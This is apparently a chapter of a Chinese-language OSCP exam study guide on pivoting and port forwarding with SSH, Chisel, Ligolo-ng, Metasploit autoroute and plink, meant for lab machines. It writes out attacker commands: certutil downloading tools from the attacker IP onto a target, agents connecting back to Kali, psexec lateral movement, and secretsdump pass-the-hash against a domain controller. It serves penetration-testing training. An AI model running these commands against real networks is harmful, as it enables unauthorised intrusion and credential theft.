# Ch 38 — Pivoting + Port Forwarding：Ligolo-ng / Chisel / SSH tunnel

> 目標：在已有立足點的機器上建立隧道，讓你能存取原本從 Kali 連不到的內網服務或機器。

## 為什麼需要 Pivoting

OSCP 考試環境有時候是分段的網路：

```
Kali (10.10.14.5) ──→ Machine A (10.10.10.x) ──→ Machine B (192.168.1.x)
                                                   （Kali 直接連不到）
```

你要在 Machine A 建立一個隧道，讓你的工具從 Kali 能「穿過」Machine A 訪問 Machine B。

## Local Port Forwarding（SSH）

**場景**：靶機有一個 MySQL 只開在本地（127.0.0.1:3306），你想從 Kali 連到它。

```bash
# SSH local port forwarding
ssh -L 1234:127.0.0.1:3306 user@10.10.10.x

# -L 1234:127.0.0.1:3306
# = 把 Kali 的 1234 port 轉發到 靶機的 127.0.0.1:3306

# 連線後，在 Kali 可以：
mysql -h 127.0.0.1 -P 1234 -u root

# 等同於：在靶機上跑 mysql -h 127.0.0.1 -P 3306
```

## Remote Port Forwarding（SSH）

**場景**：靶機沒有對外開 ssh，但靶機可以連到 Kali。讓靶機把某個服務的 port 轉發到 Kali。

```bash
# 在靶機上執行：
ssh -R 8080:127.0.0.1:80 kali@10.10.14.5

# = 把 靶機的 127.0.0.1:80 轉發到 Kali 的 8080 port
# 之後在 Kali：curl http://127.0.0.1:8080 → 就是靶機的 80 port
```

## Dynamic SOCKS Proxy（SSH）

**場景**：你有 Machine A 的 SSH，想讓所有工具都透過 Machine A 存取 Machine B。

```bash
# 在 Kali：
ssh -D 1080 user@machine_a_ip

# 建立 SOCKS5 代理，監聽 127.0.0.1:1080

# 設定工具走 SOCKS 代理：

# proxychains（全局代理）
cat /etc/proxychains4.conf
# 加入：socks5 127.0.0.1 1080

proxychains nmap -sV 192.168.1.x     # 掃內網
proxychains curl http://192.168.1.x   # 訪問內網服務
proxychains python3 psexec.py ...     # 橫向移動
```

## Chisel（最常用於考試）

Chisel 是 TCP/UDP 隧道工具，不需要 SSH，適合 Windows/Linux 靶機。

### 下載

```bash
# Kali
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gzip -d chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
mv chisel_linux_amd64 ~/tools/chisel

# Windows 版（傳到靶機）
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz
gzip -d chisel_windows_amd64.gz
mv chisel_windows_amd64 ~/tools/chisel.exe
```

### 正向代理（Chisel Server 在 Kali，靶機連過來）

```bash
# Kali（server mode）
~/tools/chisel server -p 8080 --reverse

# 靶機（client mode，把靶機的 SOCKS5 代理轉發到 Kali）
./chisel client 10.10.14.5:8080 R:socks

# 現在 Kali 的 1080 port 是 SOCKS5 代理，流量走靶機
proxychains nmap -sV 192.168.1.0/24
```

### 特定 Port Forwarding（Chisel）

```bash
# Kali server
~/tools/chisel server -p 8080 --reverse

# 靶機：把 192.168.1.10:80 轉到 Kali 的 9090
./chisel client 10.10.14.5:8080 R:9090:192.168.1.10:80

# Kali 訪問：
curl http://127.0.0.1:9090  → 就是 192.168.1.10:80
```

## Ligolo-ng（2024+ 首選，強烈建議主用）

proxychains + Chisel 的痛點：每個工具都要加 `proxychains`、SOCKS 對 UDP/ICMP 支援差、掃描超慢、容易漏封包。**Ligolo-ng** 在 Kali 建立一個 `tun` 虛擬網卡，把內網網段「變成一條本機路由」——之後**所有工具（nmap、impacket、瀏覽器）都不用加 proxychains，直接連內網 IP 就通**。這是現在 OSCP/實戰的主流做法。

### 架構

```
Kali（proxy 端，建立 ligolo tun 介面）
   ↑ 單一 TCP 連線（agent 主動連回 Kali）
靶機 A（agent 端，有內網 192.168.1.0/24 的腳）
```

### 下載

```bash
# Kali 端（proxy）+ 給靶機的 agent，都在 GitHub releases 下載對應平台
# https://github.com/nicocha30/ligolo-ng/releases
#   proxy  → Kali 跑
#   agent  → 傳到靶機跑（有 linux / windows amd64 版）
```

### 設定（Kali 端，一次性）

```bash
# 建立 tun 介面
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 啟動 proxy，監聽 11601 等 agent 連回來
./proxy -selfcert          # 自簽憑證，實驗/考試用
```

### 建立隧道

```bash
# 1) 在靶機 A 執行 agent，連回 Kali
#    Linux:
./agent -connect 10.10.14.5:11601 -ignore-cert
#    Windows:
agent.exe -connect 10.10.14.5:11601 -ignore-cert

# 2) 回到 Kali 的 proxy 介面，會看到 "agent joined"
ligolo-ng » session          # 選擇剛連進來的 session
[Agent] » ifconfig           # 看 agent 有哪些內網網段

# 3) 把內網網段路由指到 ligolo 介面（在另一個終端）
sudo ip route add 192.168.1.0/24 dev ligolo

# 4) 回 proxy 介面開始轉發
[Agent] » start
```

### 之後：所有工具直連，不用 proxychains

```bash
nmap -sV 192.168.1.10              # 直接掃，不用 proxychains！
python3 psexec.py corp/user@192.168.1.10
xfreerdp /v:192.168.1.10 /u:user   # RDP、瀏覽器都能直連
```

### 反向把內網服務帶回 Kali（listener）

```bash
# 在 proxy 的 agent session 內，把 agent 本機某 port 帶回 Kali
[Agent] » listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080
# 常用於：把 reverse shell 收到內網 agent，再回傳 Kali
```

### 雙層 pivot（A → B → C）

在第二台機器 B 上再跑一個 agent 連回 Kali，`session` 切到 B、把 C 的網段再 `ip route add` 到 ligolo 即可。Ligolo 處理多 session 比 Chisel 鏈式轉發乾淨得多。

### 三者怎麼選

| 工具 | 優點 | 適用 |
|------|------|------|
| **Ligolo-ng** | tun 介面、工具免 proxychains、速度快、多段乾淨 | **首選**，尤其要掃描/RDP/大量工具時 |
| Chisel | 單一 binary、設定簡單、SOCKS 轉發 | 只需一條 SOCKS、或環境裝不了 tun 時 |
| SSH `-L/-R/-D` | 內建、無需上傳工具 | 靶機本來就有 SSH 憑證時最快 |

> 考試建議：**先學會 Ligolo-ng 當主力**，Chisel/SSH 當備援（某些受限環境 tun 建不起來時用）。

## Metasploit Route（在 Meterpreter 中）

```bash
# 有 Meterpreter session 後
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > set SUBNET 192.168.1.0
msf6 > run

# 現在 Metasploit 的模組可以直接訪問 192.168.1.0/24
# 搭配 socks_proxy 可以讓 proxychains 用
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

## plink.exe（Windows 靶機沒有 SSH Client）

```cmd
# plink = PuTTY 的命令列版本
certutil -urlcache -f http://10.10.14.5/plink.exe C:\Windows\Temp\plink.exe

# SSH 動態代理
echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kalipass -D 1080 10.10.14.5

# 或 local port forwarding
echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kalipass -L 3306:127.0.0.1:3306 10.10.14.5
```

## 場景整合：AD 環境的 Pivoting

```
Kali → Machine A (Windows) → DC (10.10.10.1)
                              AD 只在內網，Kali 直接連不到

# Step 1：在 Machine A 啟動 Chisel 連接
./chisel.exe client 10.10.14.5:8080 R:socks

# Step 2：Kali 開 Chisel server
~/tools/chisel server -p 8080 --reverse

# Step 3：用 proxychains 掃 DC
proxychains nmap -sV 10.10.10.1 -Pn -p 88,389,445

# Step 4：透過隧道執行 impacket
proxychains python3 secretsdump.py administrator@10.10.10.1 -hashes :HASH
```

## 本章對應靶機

| 靶機 | Pivoting 場景 |
|------|-------------|
| OSCP Lab | 多段網路環境 |
| HTB Dante ProLab | 完整 pivoting 練習 |
| THM Wreath | 完整的三機器鏈 + pivoting |

## 自我檢核

- [ ] 能用 Ligolo-ng 建 tun 介面並 `ip route` 把內網網段直連（免 proxychains）
- [ ] 能用 SSH `-L` 做 Local Port Forwarding
- [ ] 能用 SSH `-D` 建 SOCKS5 代理 + proxychains
- [ ] 能用 Chisel 在靶機和 Kali 之間建立反向隧道
- [ ] 知道 proxychains 的設定檔在哪 `/etc/proxychains4.conf`
- [ ] 說得出 Ligolo-ng / Chisel / SSH 各自何時用

→ [Ch 39 AV 規避基礎：混淆、msfvenom payload 修改](./39-av-evasion.md)
